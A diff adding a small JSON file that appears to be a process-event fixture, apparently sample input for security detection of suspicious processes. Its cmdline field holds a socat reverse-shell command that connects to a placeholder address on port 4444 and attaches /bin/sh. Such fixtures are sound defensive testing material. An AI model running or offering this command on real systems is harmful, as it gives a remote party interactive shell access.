@@ -1,0 +1,12 @@
+{
+  "source": "process",
+  "process": {
+    "pid": 31337,
+    "ppid": 4100,
+    "comm": "socat",
+    "exe": "/usr/bin/socat",
+    "cmdline": "socat tcp-connect:203.0.113.7:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane",
+    "uid": 1000
+  },
+  "parent_comm": "bash"
+}
